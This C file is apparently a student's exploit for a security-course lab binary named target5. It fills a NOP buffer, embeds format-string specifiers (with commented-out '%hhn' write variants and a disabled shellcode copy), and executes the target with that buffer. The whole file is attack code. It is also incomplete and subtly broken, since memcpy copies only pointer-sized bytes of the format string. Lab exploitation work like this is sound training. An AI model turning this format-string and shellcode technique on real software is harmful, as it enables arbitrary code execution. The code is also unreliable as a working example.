#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define	LEN	256
#define NOP	0x90

int main(void)
{
	char *args[3];
  	char *env[1];
	char attack[LEN];
	int i;

	memset((void*)attack, NOP, LEN);
	attack[0] = 'S';
	attack[1] = 'U';
	attack[2] = 'Z';
//	attack[6] = '\x20';
//	memcpy((void*)attack+3, (void*)shellcode, sizeof shellcode - 1);

//	char *src = "%3cx%hhn";
//	char *src = "%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x";
	char *src = "%01x%01x%01x%01x%01x%01x%01x%01x%01x";
	memcpy((void*)attack+60, (void*)src, sizeof(src));

  	args[0] = TARGET;
	args[1] = attack;
	args[2] = NULL;
  	
	env[0] = NULL;

  	if (0 > execve(TARGET, args, env))
    		fprintf(stderr, "execve failed.\n");

  	return 0;
}
